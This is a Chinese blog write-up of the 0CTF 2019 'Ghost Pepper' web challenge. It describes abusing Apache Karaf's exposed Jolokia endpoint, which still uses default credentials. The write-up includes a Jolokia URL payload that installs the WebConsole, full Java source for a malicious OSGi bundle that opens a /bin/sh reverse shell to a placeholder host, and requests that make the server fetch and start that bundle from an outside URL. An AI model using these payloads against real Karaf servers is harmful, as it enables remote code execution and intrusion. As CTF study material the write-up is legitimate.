@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="本次writeup，纯属复现 : ) 0x01 Ghost Pepper题目地址 访问题目，提示该站点是Karaf，需要输入用户名和密码：  Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF Web writeup">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="本次writeup，纯属复现 : ) 0x01 Ghost Pepper题目地址 访问题目，提示该站点是Karaf，需要输入用户名和密码：  Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/5.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/6.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/8.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/9.png">
+<meta property="og:updated_time" content="2019-03-31T15:04:00.646Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0CTF Web writeup">
+<meta name="twitter:description" content="本次writeup，纯属复现 : ) 0x01 Ghost Pepper题目地址 访问题目，提示该站点是Karaf，需要输入用户名和密码：  Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>0CTF Web writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/03/29/Securinets-CTF-Web-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&text=0CTF Web writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&is_video=false&description=0CTF Web writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0CTF Web writeup&body=Check out this article: https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&name=0CTF Web writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Ghost-Pepper"><span class="toc-number">1.</span> <span class="toc-text">0x01 Ghost Pepper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method1——安装WebConsole"><span class="toc-number">1.1.</span> <span class="toc-text">Method1——安装WebConsole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method2——安装恶意bundle"><span class="toc-number">1.2.</span> <span class="toc-text">Method2——安装恶意bundle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Wallbreaker-Easy"><span class="toc-number">2.</span> <span class="toc-text">0x02 Wallbreaker Easy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        0CTF Web writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-31T02:56:21.000Z" itemprop="datePublished">2019-03-31</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp-Web/">WriteUp:Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Web安全/">Web安全</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>本次writeup，纯属复现 : )</p>
+<h2 id="0x01-Ghost-Pepper"><a href="#0x01-Ghost-Pepper" class="headerlink" title="0x01 Ghost Pepper"></a>0x01 Ghost Pepper</h2><p><a href="http://111.186.63.207:31337/" target="_blank" rel="noopener">题目地址</a></p>
+<p>访问题目，提示该站点是Karaf，需要输入用户名和密码：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/1.png" alt=""></p>
+<p>Karaf是一个基于OSGi的框架，而OSGi是一个Java平台，允许在运行时管理应用程序组件的生命周期，而无需重新启动应用程序。我们可以在应用程序运行时在运行时添加/删除/替换组件，部署多个版本等。Karaf框架中的用户名和密码默认均为karaf，输入进去后是个404页面：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/2.png" alt=""></p>
+<p>页面显示是使用Jetty作为Web服务器的，除此之外没找到更多的信息。</p>
+<p>搜一下题目Ghost pepper，在Wiki百科发现其别名为Bhut jolokia，然后再搜索一遍Bhut jolokia，发现Jolokia是一个JMX-HTTP桥接器，可替代JSR-160连接器。它是一种基于代理的方法，支持许多平台。除了基本的JMX操作之外，它还通过批量请求和细粒度安全策略等独特功能增强了JMX远程处理功能。</p>
+<p>那就是说，该站点应该支持Jolokia，访问一下该路径看看，果然返回了Json格式的数据：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/3.png" alt=""></p>
+<p>访问list，列出Jolokia所支持的所有操作：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/4.png" alt=""></p>
+<p>这里只列下前面的Java类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">java.util.logging</span><br><span class="line">org.eclipse.jetty.server.session</span><br><span class="line">org.ops4j.pax.web.service.jetty.internal</span><br><span class="line">org.eclipse.jetty.jmx</span><br><span class="line">osgi.compendium</span><br><span class="line">java.nio</span><br><span class="line">org.apache.karaf</span><br><span class="line">JMImplementation</span><br><span class="line">org.eclipse.jetty.util.thread</span><br><span class="line">java.lang</span><br><span class="line">com.sun.management</span><br><span class="line">jmx4perl</span><br><span class="line">connector</span><br><span class="line">sun.nio.ch</span><br><span class="line">org.eclipse.jetty.server</span><br><span class="line">org.apache.aries.blueprint</span><br><span class="line">org.eclipse.jetty.io</span><br><span class="line">osgi.core</span><br><span class="line">jolokia</span><br></pre></td></tr></table></figure>
+<p>注意到org.apache.karaf这个类，就是说我们可以通过Karaf JMX执行各种操作。下面就来找下该karaf类所支持的所有方法：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/5.png" alt=""></p>
+<p>其中可以看到很多操作命名为install，因此我们可以利用这些API来加载安装并部署我们直接编写的恶意jar程序。</p>
+<p>下面有两种方法来解它。</p>
+<h3 id="Method1——安装WebConsole"><a href="#Method1——安装WebConsole" class="headerlink" title="Method1——安装WebConsole"></a>Method1——安装WebConsole</h3><p>Karaf框架是拥有一个WebConsole的，可以通过Web端进行控制台的交互，前面我们获取了org.apache.karaf的所有支持的方法，找到其中的installFeature()，编写如下安装WebConsole的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/31/0CTF-Web-writeup/6.png" alt=""></p>
+<p>然后在URL栏访问Karaf的WebConsole界面，直接输入命令即可得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.186.63.207:31337/system/console/gogo</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/31/0CTF-Web-writeup/7.png" alt=""></p>
+<h3 id="Method2——安装恶意bundle"><a href="#Method2——安装恶意bundle" class="headerlink" title="Method2——安装恶意bundle"></a>Method2——安装恶意bundle</h3><p>在之前的org.apache.karaf类中，还可以参考<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">这篇文章</a>通过install方法来进行利用。</p>
+<p>除了该类外，还可以通过osgi.core的installBundleFromURL，这个方法可以通过URL来安装bundle，我们可以通过如下的方法找到该方法：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/8.png" alt=""></p>
+<p>此时我们可以构造一个恶意bundle打包成jar放置在我们自己的服务器中，然后访问Karaf服务让其下载并安装部署我们的恶意bundle从而实现反弹shell：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.osgi.framework.BundleActivator;</span><br><span class="line"><span class="keyword">import</span> org.osgi.framework.BundleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Activator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">BundleActivator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(BundleContext paramBundleContext)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String str = <span class="string">"1.2.3.4"</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">        Socket localSocket = <span class="keyword">new</span> Socket(str, i);</span><br><span class="line"></span><br><span class="line">        localSocket.getOutputStream().write(<span class="string">"Mi1k7ea"</span>.getBytes());</span><br><span class="line">        localSocket.getOutputStream().flush();</span><br><span class="line"><span class="comment">// localSocket.close();</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            String ShellPath;</span><br><span class="line">            ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket( str, i );</span><br><span class="line">            Process process = Runtime.getRuntime().exec( ShellPath );</span><br><span class="line">            ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</span><br><span class="line">            ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</span><br><span class="line">            process.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</span><br><span class="line">        localSocket.getOutputStream().write(<span class="string">"Mi1k7ea"</span>.getBytes());</span><br><span class="line">        localSocket.getOutputStream().flush();</span><br><span class="line">        localSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(BundleContext paramBundleContext)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"RIP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取一下该类的uuid：</p>
+<p><img src="/2019/03/31/0CTF-Web-writeup/9.png" alt=""></p>
+<p>然后通过installBundleFromURL方法来下载安装恶意bundle：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia/list HTTP/1.1</span><br><span class="line">Host: 111.186.63.207:31337</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic a2FyYWY6a2FyYWY=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: JSESSIONID=h1fouerlv92j1nzj1rn7f4hyu</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;exec&quot;,</span><br><span class="line">  &quot;mbean&quot;: &quot;osgi.core:framework=org.eclipse.osgi,type=framework,uuid=089717e7-f953-42ec-959f-cd2488bc6482,version=1.7&quot;,</span><br><span class="line">  &quot;operation&quot;: &quot;installBundleFromURL&quot;,</span><br><span class="line">  &quot;arguments&quot;: [</span><br><span class="line">    &quot;moxiaoxi&quot;,</span><br><span class="line">    &quot;http://a.com:666/m7.jar&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过response的id，来启动bundle，就可以获得一个反弹shell：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"type"</span>: <span class="string">"exec"</span>, <span class="attr">"mbean"</span>: <span class="string">"osgi.core:framework=org.eclipse.osgi,type=framework,version=1.7,uuid=089717e7-f953-42ec-959f-cd2488bc6482"</span>, <span class="attr">"operation"</span>: <span class="string">"startBundle"</span>, <span class="attr">"arguments"</span>: [ <span class="string">"93"</span> ] &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Wallbreaker-Easy"><a href="#0x02-Wallbreaker-Easy" class="headerlink" title="0x02 Wallbreaker Easy"></a>0x02 Wallbreaker Easy</h2><p><a href="http://111.186.63.208:31340" target="_blank" rel="noopener">题目地址</a>，已关闭。</p>
+<p>环境待复现…</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/" target="_blank" rel="noopener">TCTF2019 Web WP</a></p>
+
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Ghost-Pepper"><span class="toc-number">1.</span> <span class="toc-text">0x01 Ghost Pepper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method1——安装WebConsole"><span class="toc-number">1.1.</span> <span class="toc-text">Method1——安装WebConsole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method2——安装恶意bundle"><span class="toc-number">1.2.</span> <span class="toc-text">Method2——安装恶意bundle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Wallbreaker-Easy"><span class="toc-number">2.</span> <span class="toc-text">0x02 Wallbreaker Easy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&text=0CTF Web writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&is_video=false&description=0CTF Web writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0CTF Web writeup&body=Check out this article: https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&title=0CTF Web writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/31/0CTF-Web-writeup/&name=0CTF Web writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
